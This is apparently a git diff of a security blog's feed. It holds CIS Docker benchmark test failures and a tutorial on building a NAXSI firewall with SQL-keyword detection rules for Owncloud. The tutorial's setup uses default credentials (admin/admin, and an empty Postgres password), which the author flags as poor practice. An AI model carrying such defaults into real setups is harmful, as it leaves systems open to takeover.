“MacAddress”=&amp;gt;”02:42:ac:11:00:02”, “Networks”=&amp;gt;{“bridge”=&amp;gt;{“IPAMConfig”=&amp;gt;nil, “Links”=&amp;gt;nil, “Aliases”=&amp;gt;nil, “NetworkID”=&amp;gt;”d3c5d5da0b0c8d7a5567659635889697272219770d4a71554daed671526fb3b3”, “EndpointID”=&amp;gt;”f1f27a98c24c57e4caba3010259d5c0a4e35ad6c01203136e68cb7563eca1b56”, “Gateway”=&amp;gt;”172.17.0.1”, “IPAddress”=&amp;gt;”172.17.0.2”, “IPPrefixLen”=&amp;gt;16, “IPv6Gateway”=&amp;gt;””, “GlobalIPv6Address”=&amp;gt;””, “GlobalIPv6PrefixLen”=&amp;gt;0, “MacAddress”=&amp;gt;”02:42:ac:11:00:02”}}}} [“HostConfig”, “SecurityOpt”] should include /no-new-privileges/
-  Failure/Error: DEFAULT_FAILURE_NOTIFIER = lambda { |failure, _opts| raise failure }&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;   expected [&quot;label:level:s0-s0:c1023&quot;,
-   &quot;seccomp={\&quot;defaultAction\&quot;:\&quot;SCMP_ACT_ALLOW\&quot;,\&quot;syscalls\&quot;:[{\&quot;name\&quot;:\&quot;mkdir\&quot;,\&quot;action\&quot;:\&quot;SCMP_ACT_ERRNO\&quot;,\&quot;args\&quot;:[]},{\&quot;name\&quot;:\&quot;chown\&quot;,\&quot;action\&quot;:\&quot;SCMP_ACT_ERRNO\&quot;,\&quot;args\&quot;:[]}]}&quot;] to include /no-new-privileges/
-   Diff:
-   @@ -1,2 +1,3 @@
-   -[/no-new-privileges/]
-   +[&quot;label:level:s0-s0:c1023&quot;,
-   + &quot;seccomp={\&quot;defaultAction\&quot;:\&quot;SCMP_ACT_ALLOW\&quot;,\&quot;syscalls\&quot;:[{\&quot;name\&quot;:\&quot;mkdir\&quot;,\&quot;action\&quot;:\&quot;SCMP_ACT_ERRNO\&quot;,\&quot;args\&quot;:[]},{\&quot;name\&quot;:\&quot;chown\&quot;,\&quot;action\&quot;:\&quot;SCMP_ACT_ERRNO\&quot;,\&quot;args\&quot;:[]}]}&quot;]
-   # cis-docker-benchmark/controls/docker_level1.rb:903:in `block (4 levels) in load&#39;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;4) Json /etc/docker/daemon.json [“userns-remap”] should eq “default”
-     Failure/Error: DEFAULT_FAILURE_NOTIFIER = lambda { |failure, _opts| raise failure }&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;   expected: &quot;default&quot;
-        got: nil
-
-   (compared using ==)
- # cis-docker-benchmark/controls/docker_level2.rb:37:in `block (3 levels) in load&#39;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;5) Json /etc/docker/daemon.json [“log-driver”] should not be empty
+  1) Json /etc/docker/daemon.json [&quot;default-ulimits&quot;, &quot;nproc&quot;] should eq &quot;1024:2408&quot;
      Failure/Error: DEFAULT_FAILURE_NOTIFIER = lambda { |failure, _opts| raise failure }
-       expected nil to respond to &lt;code&gt;empty?&lt;/code&gt;
-     # cis-docker-benchmark/controls/docker_level2.rb:88:in `block (3 levels) in load’&lt;/p&gt;
 
-&lt;p&gt;6) Json /etc/docker/daemon.json [“log-driver”] should eq “syslog”
-     Failure/Error: DEFAULT_FAILURE_NOTIFIER = lambda { |failure, _opts| raise failure }&lt;/p&gt;
+       expected: &quot;1024:2408&quot;
+            got: nil
 
-&lt;pre&gt;&lt;code&gt;   expected: &quot;syslog&quot;
-        got: nil
+       (compared using ==)
+     # cis-docker-benchmark/controls/docker_level1.rb:120:in `block (3 levels) in load'
 
-   (compared using ==)
- # cis-docker-benchmark/controls/docker_level2.rb:91:in `block (3 levels) in load&#39;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;7) Json /etc/docker/daemon.json [“log-opts”] should include /syslog-address/
+  2) Json /etc/docker/daemon.json [&quot;default-ulimits&quot;, &quot;nofile&quot;] should eq &quot;100:200&quot;
      Failure/Error: DEFAULT_FAILURE_NOTIFIER = lambda { |failure, _opts| raise failure }
-       expected nil to include /syslog-address/, but it does not respond to &lt;code&gt;include?&lt;/code&gt;
-     # cis-docker-benchmark/controls/docker_level2.rb:94:in `block (3 levels) in load’&lt;/p&gt;
 
-&lt;p&gt;Finished in 1.1 seconds (files took 10.51 seconds to load)
+       expected: &quot;100:200&quot;
+            got: nil
+
+       (compared using ==)
+     # cis-docker-benchmark/controls/docker_level1.rb:123:in `block (3 levels) in load'
+
+  3) {&quot;Id&quot;=&amp;gt;&quot;d959bba770f00a2a58c235002b530418d886b814b3743806c49838442b11106d&quot;, &quot;Created&quot;=&amp;gt;&quot;2016-05-30T07:31:58.879644757Z&quot;, &quot;Path&quot;=&amp;gt;&quot;/bin/bash&quot;, &quot;Args&quot;=&amp;gt;[&quot;-c&quot;, &quot;while true; do echo hello world; sleep 1; done&quot;], &quot;State&quot;=&amp;gt;{&quot;Status&quot;=&amp;gt;&quot;running&quot;, &quot;Running&quot;=&amp;gt;true, &quot;Paused&quot;=&amp;gt;false, &quot;Restarting&quot;=&amp;gt;false, &quot;OOMKilled&quot;=&amp;gt;false, &quot;Dead&quot;=&amp;gt;false, &quot;Pid&quot;=&amp;gt;21019, &quot;ExitCode&quot;=&amp;gt;0, &quot;Error&quot;=&amp;gt;&quot;&quot;, &quot;StartedAt&quot;=&amp;gt;&quot;2016-05-30T07:31:59.183990208Z&quot;, &quot;FinishedAt&quot;=&amp;gt;&quot;0001-01-01T00:00:00Z&quot;}, &quot;Image&quot;=&amp;gt;&quot;sha256:26bb67a2a5908b2c9858a69be0160f4610ddfb956b775f975e748ee85736b417&quot;, &quot;ResolvConfPath&quot;=&amp;gt;&quot;/var/lib/docker/containers/d959bba770f00a2a58c235002b530418d886b814b3743806c49838442b11106d/resolv.conf&quot;, &quot;HostnamePath&quot;=&amp;gt;&quot;/var/lib/docker/containers/d959bba770f00a2a58c235002b530418d886b814b3743806c49838442b11106d/hostname&quot;, &quot;HostsPath&quot;=&amp;gt;&quot;/var/lib/docker/containers/d959bba770f00a2a58c235002b530418d886b814b3743806c49838442b11106d/hosts&quot;, &quot;LogPath&quot;=&amp;gt;&quot;/var/lib/docker/containers/d959bba770f00a2a58c235002b530418d886b814b3743806c49838442b11106d/d959bba770f00a2a58c235002b530418d886b814b3743806c49838442b11106d-json.log&quot;, &quot;Name&quot;=&amp;gt;&quot;/ubuntu-test&quot;, &quot;RestartCount&quot;=&amp;gt;0, &quot;Driver&quot;=&amp;gt;&quot;devicemapper&quot;, &quot;MountLabel&quot;=&amp;gt;&quot;system_u:object_r:svirt_sandbox_file_t:s0-s0:c1023&quot;, &quot;ProcessLabel&quot;=&amp;gt;&quot;system_u:system_r:svirt_lxc_net_t:s0-s0:c1023&quot;, &quot;AppArmorProfile&quot;=&amp;gt;&quot;&quot;, &quot;ExecIDs&quot;=&amp;gt;nil, &quot;HostConfig&quot;=&amp;gt;{&quot;Binds&quot;=&amp;gt;[&quot;/tmp:/test&quot;], &quot;ContainerIDFile&quot;=&amp;gt;&quot;&quot;, &quot;LogConfig&quot;=&amp;gt;{&quot;Type&quot;=&amp;gt;&quot;json-file&quot;, &quot;Config&quot;=&amp;gt;nil}, &quot;NetworkMode&quot;=&amp;gt;&quot;default&quot;, &quot;PortBindings&quot;=&amp;gt;{&quot;23/tcp&quot;=&amp;gt;[{&quot;HostIp&quot;=&amp;gt;&quot;172.17.0.1&quot;, &quot;HostPort&quot;=&amp;gt;&quot;2222&quot;}]}, &quot;RestartPolicy&quot;=&amp;gt;{&quot;Name&quot;=&amp;gt;&quot;on-failure&quot;, &quot;MaximumRetryCount&quot;=&amp;gt;5}, &quot;AutoRemove&quot;=&amp;gt;false, &quot;VolumeDriver&quot;=&amp;gt;&quot;&quot;, &quot;VolumesFrom&quot;=&amp;gt;nil, &quot;CapAdd&quot;=&amp;gt;nil, &quot;CapDrop&quot;=&amp;gt;[&quot;all&quot;], &quot;Dns&quot;=&amp;gt;[], &quot;DnsOptions&quot;=&amp;gt;[], &quot;DnsSearch&quot;=&amp;gt;[], &quot;ExtraHosts&quot;=&amp;gt;nil, &quot;GroupAdd&quot;=&amp;gt;nil, &quot;IpcMode&quot;=&amp;gt;&quot;&quot;, &quot;Cgroup&quot;=&amp;gt;&quot;&quot;, &quot;Links&quot;=&amp;gt;nil, &quot;OomScoreAdj&quot;=&amp;gt;0, &quot;PidMode&quot;=&amp;gt;&quot;&quot;, &quot;Privileged&quot;=&amp;gt;false, &quot;PublishAllPorts&quot;=&amp;gt;false, &quot;ReadonlyRootfs&quot;=&amp;gt;true, &quot;SecurityOpt&quot;=&amp;gt;[&quot;label:level:s0-s0:c1023&quot;, &quot;seccomp={\&quot;defaultAction\&quot;:\&quot;SCMP_ACT_ALLOW\&quot;,\&quot;syscalls\&quot;:[{\&quot;name\&quot;:\&quot;mkdir\&quot;,\&quot;action\&quot;:\&quot;SCMP_ACT_ERRNO\&quot;,\&quot;args\&quot;:[]},{\&quot;name\&quot;:\&quot;chown\&quot;,\&quot;action\&quot;:\&quot;SCMP_ACT_ERRNO\&quot;,\&quot;args\&quot;:[]}]}&quot;], &quot;StorageOpt&quot;=&amp;gt;nil, &quot;UTSMode&quot;=&amp;gt;&quot;&quot;, &quot;UsernsMode&quot;=&amp;gt;&quot;&quot;, &quot;ShmSize&quot;=&amp;gt;67108864, &quot;ConsoleSize&quot;=&amp;gt;[0, 0], &quot;Isolation&quot;=&amp;gt;&quot;&quot;, &quot;CpuShares&quot;=&amp;gt;512, &quot;Memory&quot;=&amp;gt;268435456, &quot;CgroupParent&quot;=&amp;gt;&quot;&quot;, &quot;BlkioWeight&quot;=&amp;gt;0, &quot;BlkioWeightDevice&quot;=&amp;gt;nil, &quot;BlkioDeviceReadBps&quot;=&amp;gt;nil, &quot;BlkioDeviceWriteBps&quot;=&amp;gt;nil, &quot;BlkioDeviceReadIOps&quot;=&amp;gt;nil, &quot;BlkioDeviceWriteIOps&quot;=&amp;gt;nil, &quot;CpuPeriod&quot;=&amp;gt;0, &quot;CpuQuota&quot;=&amp;gt;0, &quot;CpusetCpus&quot;=&amp;gt;&quot;&quot;, &quot;CpusetMems&quot;=&amp;gt;&quot;&quot;, &quot;Devices&quot;=&amp;gt;[], &quot;DiskQuota&quot;=&amp;gt;0, &quot;KernelMemory&quot;=&amp;gt;0, &quot;MemoryReservation&quot;=&amp;gt;0, &quot;MemorySwap&quot;=&amp;gt;536870912, &quot;MemorySwappiness&quot;=&amp;gt;-1, &quot;OomKillDisable&quot;=&amp;gt;false, &quot;PidsLimit&quot;=&amp;gt;0, &quot;Ulimits&quot;=&amp;gt;nil, &quot;CpuCount&quot;=&amp;gt;0, &quot;CpuPercent&quot;=&amp;gt;0, &quot;BlkioIOps&quot;=&amp;gt;0, &quot;BlkioBps&quot;=&amp;gt;0, &quot;SandboxSize&quot;=&amp;gt;0}, &quot;GraphDriver&quot;=&amp;gt;{&quot;Name&quot;=&amp;gt;&quot;devicemapper&quot;, &quot;Data&quot;=&amp;gt;{&quot;DeviceId&quot;=&amp;gt;&quot;61&quot;, &quot;DeviceName&quot;=&amp;gt;&quot;docker-8:17-311297-1b14cce13804c1db6d55a208a92cface12ff89cca4916f01e4199a776019fad8&quot;, &quot;DeviceSize&quot;=&amp;gt;&quot;10737418240&quot;}}, &quot;Mounts&quot;=&amp;gt;[{&quot;Source&quot;=&amp;gt;&quot;/tmp&quot;, &quot;Destination&quot;=&amp;gt;&quot;/test&quot;, &quot;Mode&quot;=&amp;gt;&quot;&quot;, &quot;RW&quot;=&amp;gt;true, &quot;Propagation&quot;=&amp;gt;&quot;rprivate&quot;}], &quot;Config&quot;=&amp;gt;{&quot;Hostname&quot;=&amp;gt;&quot;d959bba770f0&quot;, &quot;Domainname&quot;=&amp;gt;&quot;&quot;, &quot;User&quot;=&amp;gt;&quot;ubuntu&quot;, &quot;AttachStdin&quot;=&amp;gt;false, &quot;AttachStdout&quot;=&amp;gt;false, &quot;AttachStderr&quot;=&amp;gt;false, &quot;ExposedPorts&quot;=&amp;gt;{&quot;23/tcp&quot;=&amp;gt;{}}, &quot;Tty&quot;=&amp;gt;false, &quot;OpenStdin&quot;=&amp;gt;false, &quot;StdinOnce&quot;=&amp;gt;false, &quot;Env&quot;=&amp;gt;[&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;], &quot;Cmd&quot;=&amp;gt;[&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;while true; do echo hello world; sleep 1; done&quot;], &quot;Image&quot;=&amp;gt;&quot;ubuntu-test:latest&quot;, &quot;Volumes&quot;=&amp;gt;nil, &quot;WorkingDir&quot;=&amp;gt;&quot;&quot;, &quot;Entrypoint&quot;=&amp;gt;nil, &quot;OnBuild&quot;=&amp;gt;nil, &quot;Labels&quot;=&amp;gt;{}}, &quot;NetworkSettings&quot;=&amp;gt;{&quot;Bridge&quot;=&amp;gt;&quot;&quot;, &quot;SandboxID&quot;=&amp;gt;&quot;a5a927291513b5d6a8910463bc7ea7242339a6f20e0cdee29325dc83bdc4cf29&quot;, &quot;HairpinMode&quot;=&amp;gt;false, &quot;LinkLocalIPv6Address&quot;=&amp;gt;&quot;&quot;, &quot;LinkLocalIPv6PrefixLen&quot;=&amp;gt;0, &quot;Ports&quot;=&amp;gt;{&quot;23/tcp&quot;=&amp;gt;[{&quot;HostIp&quot;=&amp;gt;&quot;172.17.0.1&quot;, &quot;HostPort&quot;=&amp;gt;&quot;2222&quot;}]}, &quot;SandboxKey&quot;=&amp;gt;&quot;/var/run/docker/netns/a5a927291513&quot;, &quot;SecondaryIPAddresses&quot;=&amp;gt;nil, &quot;SecondaryIPv6Addresses&quot;=&amp;gt;nil, &quot;EndpointID&quot;=&amp;gt;&quot;f1f27a98c24c57e4caba3010259d5c0a4e35ad6c01203136e68cb7563eca1b56&quot;, &quot;Gateway&quot;=&amp;gt;&quot;172.17.0.1&quot;, &quot;GlobalIPv6Address&quot;=&amp;gt;&quot;&quot;, &quot;GlobalIPv6PrefixLen&quot;=&amp;gt;0, &quot;IPAddress&quot;=&amp;gt;&quot;172.17.0.2&quot;, &quot;IPPrefixLen&quot;=&amp;gt;16, &quot;IPv6Gateway&quot;=&amp;gt;&quot;&quot;, &quot;MacAddress&quot;=&amp;gt;&quot;02:42:ac:11:00:02&quot;, &quot;Networks&quot;=&amp;gt;{&quot;bridge&quot;=&amp;gt;{&quot;IPAMConfig&quot;=&amp;gt;nil, &quot;Links&quot;=&amp;gt;nil, &quot;Aliases&quot;=&amp;gt;nil, &quot;NetworkID&quot;=&amp;gt;&quot;d3c5d5da0b0c8d7a5567659635889697272219770d4a71554daed671526fb3b3&quot;, &quot;EndpointID&quot;=&amp;gt;&quot;f1f27a98c24c57e4caba3010259d5c0a4e35ad6c01203136e68cb7563eca1b56&quot;, &quot;Gateway&quot;=&amp;gt;&quot;172.17.0.1&quot;, &quot;IPAddress&quot;=&amp;gt;&quot;172.17.0.2&quot;, &quot;IPPrefixLen&quot;=&amp;gt;16, &quot;IPv6Gateway&quot;=&amp;gt;&quot;&quot;, &quot;GlobalIPv6Address&quot;=&amp;gt;&quot;&quot;, &quot;GlobalIPv6PrefixLen&quot;=&amp;gt;0, &quot;MacAddress&quot;=&amp;gt;&quot;02:42:ac:11:00:02&quot;}}}} [&quot;HostConfig&quot;, &quot;SecurityOpt&quot;] should include /no-new-privileges/
+  Failure/Error: DEFAULT_FAILURE_NOTIFIER = lambda { |failure, _opts| raise failure }
+
+       expected [&quot;label:level:s0-s0:c1023&quot;,
+       &quot;seccomp={\&quot;defaultAction\&quot;:\&quot;SCMP_ACT_ALLOW\&quot;,\&quot;syscalls\&quot;:[{\&quot;name\&quot;:\&quot;mkdir\&quot;,\&quot;action\&quot;:\&quot;SCMP_ACT_ERRNO\&quot;,\&quot;args\&quot;:[]},{\&quot;name\&quot;:\&quot;chown\&quot;,\&quot;action\&quot;:\&quot;SCMP_ACT_ERRNO\&quot;,\&quot;args\&quot;:[]}]}&quot;] to include /no-new-privileges/
+       Diff:
+       @@ -1,2 +1,3 @@
+       -[/no-new-privileges/]
+       +[&quot;label:level:s0-s0:c1023&quot;,
+       + &quot;seccomp={\&quot;defaultAction\&quot;:\&quot;SCMP_ACT_ALLOW\&quot;,\&quot;syscalls\&quot;:[{\&quot;name\&quot;:\&quot;mkdir\&quot;,\&quot;action\&quot;:\&quot;SCMP_ACT_ERRNO\&quot;,\&quot;args\&quot;:[]},{\&quot;name\&quot;:\&quot;chown\&quot;,\&quot;action\&quot;:\&quot;SCMP_ACT_ERRNO\&quot;,\&quot;args\&quot;:[]}]}&quot;]
+       # cis-docker-benchmark/controls/docker_level1.rb:903:in `block (4 levels) in load'
+
+  4) Json /etc/docker/daemon.json [&quot;userns-remap&quot;] should eq &quot;default&quot;
+     Failure/Error: DEFAULT_FAILURE_NOTIFIER = lambda { |failure, _opts| raise failure }
+
+       expected: &quot;default&quot;
+            got: nil
+
+       (compared using ==)
+     # cis-docker-benchmark/controls/docker_level2.rb:37:in `block (3 levels) in load'
+
+  5) Json /etc/docker/daemon.json [&quot;log-driver&quot;] should not be empty
+     Failure/Error: DEFAULT_FAILURE_NOTIFIER = lambda { |failure, _opts| raise failure }
+       expected nil to respond to `empty?`
+     # cis-docker-benchmark/controls/docker_level2.rb:88:in `block (3 levels) in load'
+
+  6) Json /etc/docker/daemon.json [&quot;log-driver&quot;] should eq &quot;syslog&quot;
+     Failure/Error: DEFAULT_FAILURE_NOTIFIER = lambda { |failure, _opts| raise failure }
+
+       expected: &quot;syslog&quot;
+            got: nil
+
+       (compared using ==)
+     # cis-docker-benchmark/controls/docker_level2.rb:91:in `block (3 levels) in load'
+
+  7) Json /etc/docker/daemon.json [&quot;log-opts&quot;] should include /syslog-address/
+     Failure/Error: DEFAULT_FAILURE_NOTIFIER = lambda { |failure, _opts| raise failure }
+       expected nil to include /syslog-address/, but it does not respond to `include?`
+     # cis-docker-benchmark/controls/docker_level2.rb:94:in `block (3 levels) in load'
+
+Finished in 1.1 seconds (files took 10.51 seconds to load)
 197 examples, 7 failures, 4 pending
-```&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;As you can see it runs 197 InSpec tests with 7 failures. I am waiting that docker fixes those failures:&lt;/p&gt;
 
@@ -686,9 +1008,9 @@ Failures:&lt;/p&gt;
  
  <entry>
    <title>Create a NAXSI WAF for Owncloud</title>
-   <link href="http://atomic111.github.io/article/create-a-naxsi-waf-for-owncloud"/>
-   <updated>2016-02-17T19:00:00+00:00</updated>
-   <id>http://atomic111.github.io/article/create-a-naxsi-waf-for-owncloud</id>
+   <link href="http://localhost:4000/article/create-a-naxsi-waf-for-owncloud"/>
+   <updated>2016-02-17T20:00:00+01:00</updated>
+   <id>http://localhost:4000/article/create-a-naxsi-waf-for-owncloud</id>
    <content type="html">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
 
 &lt;p&gt;A secure architecture of a web application consists of 3 components: a frontend, an application and a data backend. The frontend server’s task from a security perspective is to terminate SSL and to be the first line of defense. That means it inspects and validates requests from the untrusted outside world.&lt;/p&gt;
@@ -732,23 +1054,23 @@ Failures:&lt;/p&gt;
   &lt;li&gt;str: string matcher&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;String matcher are faster than regular expressions, which makes them the preferred pattern. This example uses a regular expression to search for the keyword &lt;code&gt;select|from&lt;/code&gt; in the request.&lt;/p&gt;
+&lt;p&gt;String matcher are faster than regular expressions, which makes them the preferred pattern. This example uses a regular expression to search for the keyword &lt;code class=&quot;highlighter-rouge&quot;&gt;select|from&lt;/code&gt; in the request.&lt;/p&gt;
 
 &lt;h3 id=&quot;msg&quot;&gt;MSG&lt;/h3&gt;
 
-&lt;p&gt;MSG is a human readable message and describes the pattern. This example includes the message &lt;code&gt;select and from sql keywords&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;MSG is a human readable message and describes the pattern. This example includes the message &lt;code class=&quot;highlighter-rouge&quot;&gt;select and from sql keywords&lt;/code&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;match-zone&quot;&gt;Match Zone&lt;/h3&gt;
 
-&lt;p&gt;Match zones defines which part of the request will be searched to find the specified pattern. This example rule searches in &lt;code&gt;BODY|URL|ARGS|$HEADERS_VAR:Cookie&lt;/code&gt;. With this simple expression, it is easy to target the whole body. This includes the complete content and every variable name in the body. It also searches in the URL and in the request ARGS, including the complete content and every name of variable in its arguments. &lt;code&gt;$HEADERS_VAR:Cookie&lt;/code&gt; means that NAXSI will also search in the HTTP “Cookie” header for the specified pattern.&lt;/p&gt;
+&lt;p&gt;Match zones defines which part of the request will be searched to find the specified pattern. This example rule searches in &lt;code class=&quot;highlighter-rouge&quot;&gt;BODY|URL|ARGS|$HEADERS_VAR:Cookie&lt;/code&gt;. With this simple expression, it is easy to target the whole body. This includes the complete content and every variable name in the body. It also searches in the URL and in the request ARGS, including the complete content and every name of variable in its arguments. &lt;code class=&quot;highlighter-rouge&quot;&gt;$HEADERS_VAR:Cookie&lt;/code&gt; means that NAXSI will also search in the HTTP “Cookie” header for the specified pattern.&lt;/p&gt;
 
 &lt;h3 id=&quot;score-section&quot;&gt;Score Section&lt;/h3&gt;
 
-&lt;p&gt;s is the score section. It is a “named” counter and will increase the &lt;code&gt;SQL&lt;/code&gt; counter by 4.&lt;/p&gt;
+&lt;p&gt;s is the score section. It is a “named” counter and will increase the &lt;code class=&quot;highlighter-rouge&quot;&gt;SQL&lt;/code&gt; counter by 4.&lt;/p&gt;
 
 &lt;h3 id=&quot;id&quot;&gt;ID&lt;/h3&gt;
 
-&lt;p&gt;id is the ID of the rule. This example has the ID &lt;code&gt;1000&lt;/code&gt;. Those IDs will be used in NAXSI_FMT and/or to whitelist this ID for a special request.&lt;/p&gt;
+&lt;p&gt;id is the ID of the rule. This example has the ID &lt;code class=&quot;highlighter-rouge&quot;&gt;1000&lt;/code&gt;. Those IDs will be used in NAXSI_FMT and/or to whitelist this ID for a special request.&lt;/p&gt;
 
 &lt;p&gt;Further reading: &lt;a href=&quot;https://github.com/nbs-system/naxsi/wiki/rulessyntax&quot;&gt;rules syntax&lt;/a&gt;&lt;/p&gt;
 
@@ -764,59 +1086,55 @@ Failures:&lt;/p&gt;
 
 &lt;h3 id=&quot;match-zone-1&quot;&gt;Match Zone&lt;/h3&gt;
 
-&lt;p&gt;Match zones defines which part of the request will be searched for the specified pattern (like for MainRules). This example rule searches in &lt;code&gt;$BODY_VAR:password&lt;/code&gt; for the specified pattern. &lt;code&gt;$BODY_VAR:password&lt;/code&gt; means NAXSI will search for the body variable named “password” for the specified pattern.&lt;/p&gt;
+&lt;p&gt;Match zones defines which part of the request will be searched for the specified pattern (like for MainRules). This example rule searches in &lt;code class=&quot;highlighter-rouge&quot;&gt;$BODY_VAR:password&lt;/code&gt; for the specified pattern. &lt;code class=&quot;highlighter-rouge&quot;&gt;$BODY_VAR:password&lt;/code&gt; means NAXSI will search for the body variable named “password” for the specified pattern.&lt;/p&gt;
 
 &lt;p&gt;Further reading &lt;a href=&quot;https://github.com/nbs-system/naxsi/wiki/whitelists&quot;&gt;whitelists&lt;/a&gt;&lt;/p&gt;
 
 &lt;h1 id=&quot;start-the-owncloud-and-create-naxsi-rules&quot;&gt;Start the owncloud and create NAXSI rules&lt;/h1&gt;
 
-&lt;p&gt;First, we need to install docker and docker-compose. Then download the Project from &lt;a href=&quot;https://github.com/atomic111/example-NAXSI-owncloud.git&quot;&gt;github&lt;/a&gt; and just execute the &lt;code&gt;start.sh&lt;/code&gt; bash script. It creates the data volume container for the Postgres database and for the Owncloud application. It also creates the Postgres container with default user/passwords (user=postgres and empty password) and creates Owncloud itself with the default user/password (user = admin, password = admin). &lt;strong&gt;Not a good security practice. Sorry.&lt;/strong&gt; Let’s focus on creating the WAF for owncloud.&lt;/p&gt;
+&lt;p&gt;First, we need to install docker and docker-compose. Then download the Project from &lt;a href=&quot;https://github.com/atomic111/example-NAXSI-owncloud.git&quot;&gt;github&lt;/a&gt; and just execute the &lt;code class=&quot;highlighter-rouge&quot;&gt;start.sh&lt;/code&gt; bash script. It creates the data volume container for the Postgres database and for the Owncloud application. It also creates the Postgres container with default user/passwords (user=postgres and empty password) and creates Owncloud itself with the default user/password (user = admin, password = admin). &lt;strong&gt;Not a good security practice. Sorry.&lt;/strong&gt; Let’s focus on creating the WAF for owncloud.&lt;/p&gt;
 
-&lt;p&gt;The &lt;code&gt;start.sh&lt;/code&gt; also creates the image and container for the NAXSI WAF. The container starts the WAF in LEARNING MODE and elasticsearch to store NAXSI events.&lt;/p&gt;
+&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;start.sh&lt;/code&gt; also creates the image and container for the NAXSI WAF. The container starts the WAF in LEARNING MODE and elasticsearch to store NAXSI events.&lt;/p&gt;
 
-&lt;p&gt;After the execution of &lt;code&gt;start.sh&lt;/code&gt; it should look like this.&lt;/p&gt;
+&lt;p&gt;After the execution of &lt;code class=&quot;highlighter-rouge&quot;&gt;start.sh&lt;/code&gt; it should look like this.&lt;/p&gt;
 
-&lt;p&gt;&lt;code&gt;
-∅&amp;gt; docker ps --format &quot;table :\t&quot;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;∅&amp;gt; docker ps --format &quot;table :\t&quot;
 NAMES                       PORTS
 owncloud_waf_1:             0.0.0.0:443-&amp;gt;443/tcp
 owncloud_app_1:             80/tcp
 owncloud_postgres_1:        5432/tcp
 owncloud_elasticsearch_1:   9200/tcp, 9300/tcp
-&lt;/code&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;create-the-first-naxsi-rule&quot;&gt;Create the first NAXSI rule&lt;/h2&gt;
 
-&lt;p&gt;Now the application is started and we have to browse the website to generate data in the logfile (&lt;code&gt;/var/log/nginx/naxsi_error.log&lt;/code&gt;). Log into owncloud via your browser (&lt;code&gt;https://127.0.0.1&lt;/code&gt;), upload a few pictures, create a folder, add a user, delete a file, delete a user, delete a group and click around. Create a lot of different events to prevent false-positives later on.&lt;/p&gt;
+&lt;p&gt;Now the application is started and we have to browse the website to generate data in the logfile (&lt;code class=&quot;highlighter-rouge&quot;&gt;/var/log/nginx/naxsi_error.log&lt;/code&gt;). Log into owncloud via your browser (&lt;code class=&quot;highlighter-rouge&quot;&gt;https://127.0.0.1&lt;/code&gt;), upload a few pictures, create a folder, add a user, delete a file, delete a user, delete a group and click around. Create a lot of different events to prevent false-positives later on.&lt;/p&gt;
 
-&lt;p&gt;To log into the WAF, run &lt;code&gt;docker exec -it owncloud_waf_1 bash&lt;/code&gt; and add a nxapi index to the elasticsearch database with the following command:&lt;/p&gt;
+&lt;p&gt;To log into the WAF, run &lt;code class=&quot;highlighter-rouge&quot;&gt;docker exec -it owncloud_waf_1 bash&lt;/code&gt; and add a nxapi index to the elasticsearch database with the following command:&lt;/p&gt;
 
-&lt;p&gt;&lt;code&gt;
-curl -XPUT &#39;http://elasticsearch:9200/nxapi/&#39;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -XPUT 'http://elasticsearch:9200/nxapi/'
 {&quot;acknowledged&quot;:true}
-&lt;/code&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Next, we need to load the data from the log file into ElasticSearch with the following command:&lt;/p&gt;
 
-&lt;p&gt;```
-nxtool.py -c /etc/nginx/nxapi.json –files=/var/log/nginx/naxsi_error.log
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nxtool.py -c /etc/nginx/nxapi.json --files=/var/log/nginx/naxsi_error.log
 # size :1000
-WARNING:root:List of files :[‘/var/log/nginx/naxsi_error.log’]
+WARNING:root:List of files :['/var/log/nginx/naxsi_error.log']
 log open
-{‘date’: ‘2016-02-16T14:29:33+00’, ‘events’: [{‘zone’: ‘HEADERS’, ‘ip’: ‘127.0.0.1’, ‘uri’: ‘/’, ‘server’: ‘127.0.0.1’, ‘content’: ‘’, ‘var_name’: ‘cookie’, ‘coords’: [104.195397, 35.86166], ‘country’: ‘CN’, ‘date’: ‘2016-02-16T14:29:33+00’, ‘id’: ‘1315’}]}
-{‘date’: ‘2016-02-16T14:29:36+00’, ‘events’: [{‘zone’: ‘HEADERS’, ‘ip’: ‘127.0.0.1’, ‘uri’: ‘/index.php/apps/files/’, ‘server’: ‘127.0.0.1’, ‘content’: ‘’, ‘var_name’: ‘cookie’, ‘coords’: [104.195397, 35.86166], ‘country’: ‘CN’, ‘date’: ‘2016-02-16T14:29:36+00’, ‘id’: ‘1315’}]}&lt;/p&gt;
+{'date': '2016-02-16T14:29:33+00', 'events': [{'zone': 'HEADERS', 'ip': '127.0.0.1', 'uri': '/', 'server': '127.0.0.1', 'content': '', 'var_name': 'cookie', 'coords': [104.195397, 35.86166], 'country': 'CN', 'date': '2016-02-16T14:29:33+00', 'id': '1315'}]}
